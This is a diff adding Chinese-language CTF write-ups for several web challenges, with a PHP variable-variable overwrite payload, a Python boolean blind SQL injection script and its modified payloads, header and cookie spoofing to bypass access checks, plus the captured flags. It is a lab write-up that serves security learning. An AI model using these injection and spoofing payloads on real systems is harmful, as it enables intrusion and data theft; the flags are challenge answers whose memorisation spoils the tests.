@@ -57,3 +57,158 @@ NSSCTF{b3333432-7dff-4ca8-b6f4-cd4bd5fc6688};
 通过修改 Request 中的 `filename` 为 `f1ag.php` 即可得到 flag 了。
 
 <figure><img src=".gitbook/assets/what_are_y0u_uploading？-1.png" alt=""><figcaption></figcaption></figure>
+
+### ezphp
+
+先来分析源码\~
+
+```php
+<?php
+
+highlight_file('source.txt');
+echo "<br><br>";
+
+$flag = 'xxxxxxxx';
+$giveme = 'can can need flag!';
+$getout = 'No! flag.Try again. Come on!';
+
+// $_GET['flag'] 和 $_POST['flag'] 至少存在一个
+if(!isset($_GET['flag']) && !isset($_POST['flag'])){
+    exit($giveme);
+}
+
+// $_GET['flag'] 和 $_POST['flag'] 至少一个值为 flag
+if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
+    exit($getout);
+}
+
+//将 value 的值赋给 $key
+foreach ($_POST as $key => $value) {
+    $$key = $value;
+}
+
+//将 $value 的值赋给 $key
+foreach ($_GET as $key => $value) {
+    $$key = $$value;
+}
+
+echo 'the flag is : ' . $flag;
+
+?>
+```
+
+分析结束后，通过构造以下 Payload
+
+```
+test=flag&flag=test
+```
+
+就可以获得到 flag 了，原理是先将 test 的值复制 flag 的值，又因为必须存在一个 `$_GET['flag'] === 'flag'` ，因此将 flag 的值改为 test 的值就可以了。
+
+### Sqlmap\_boy
+
+查看网站源代码可以发现
+
+```html
+<!-- $sql = 'select username,password from users where username="'.$username.'" && password="'.$password.'";'; -->
+```
+
+通过访问 `http://node2.anna.nssctf.cn:28497/login.php` 回显
+
+```json
+{
+	code: "0",
+	message: "用户名或密码错误"
+}
+```
+
+应该可以推断为布尔注入，通过编写以下代码
+
+```python
+import time
+import requests
+
+url = 'http://node2.anna.nssctf.cn:28497/login.php'
+session = requests.Session()
+def getDatabase():
+    results = []
+    for i in range(1000):
+        print(f'{i}...')
+        start = -1
+        end = 255
+        mid = -1
+        while start < end:
+            mid = (start + end) // 2
+            params = {"username": f'admin" and (ascii(substr(database(),{i+1},1))>{mid})#'}
+            ret = session.post(url, data=params)
+            if '"code":"1"' in ret.text:
+                start = mid + 1
+            else:
+                end = mid
+            time.sleep(0.05)
+        if mid == -1:
+            break
+        results.append(chr(start))
+        print(''.join(results))
+    return ''.join(results)
+
+begin = time.time()
+getDatabase()
+print(f'time spend: {time.time() - begin}')
+```
+
+可以得到数据库名为 `moectf` ，通过修改上面代码中的变量 params 成如下内容
+
+```python
+params = {"username": f'admin" and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="moectf" limit 0,1),{i+1},1))>{mid})#'}
+```
+
+可以得到数据库表 `articles,flag,users` ，通过修改上面代码中的变量 params 成如下内容
+
+```python
+params = {"username": f'admin" and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema="moectf" and table_name="flag"),{i+1},1))>{mid})#'}
+```
+
+可以得到列名 `flAg` ，通过修改上面代码中的变量 params 成如下内容
+
+```python
+params = {"username": f'admin" and (ascii(substr((select flAg from flag limit 0, 1),{i+1},1))>{mid})#'}
+```
+
+就可以得到 flag 力！
+
+### cookiehead
+
+题目包含 cookie ，那就是 Cookies 里面一探究竟！
+
+首先打开题目后到达第一关 `仅限本地访问` ，用 HackBar 添加 Header
+
+```http
+X-Forwarded-For: 127.0.0.1
+```
+
+之后提示 `请先登录` ，将 Cookies 修改成 `login=1` 即可。
+
+最后一关 `You are not from http://127.0.0.1/index.php !` 则添加 Header
+
+```http
+Referer: http://127.0.0.1/index.php
+```
+
+就可以得到 flag 啦！
+
+### God\_of\_aim
+
+右键查看源代码可以得到提示
+
+```html
+<!-- 你知道吗？index.js实例化了一个aimTrainer对象-->
+```
+
+可以在 `aimtrainer.js` 文件中发现 `checkflag1()` 和 `checkflag2()` 函数，在 Console 输入 `_0x78bd` 可以得到回显
+
+```js
+['aimTrainerEl', 'aim-trainer', 'getElementById', 'scoreEl', 'score', 'aimscore', 'delay', 'targetSize', 'aimscoreEL', 'setScore', 'start', 'innerHTML', 'setAimScore', 'position', 'style', 'relative', 'timer', 'createTarget', 'checkflag1', 'checkflag2', 'stop', 'moectf{Oh_you_can_a1m_', '你已经学会瞄准了！试试看:', 'start2', 'and_H4ck_Javascript}', '']
+```
+
+就可以得到 flag `moectf{Oh_you_can_a1m_and_H4ck_Javascript}` 了！
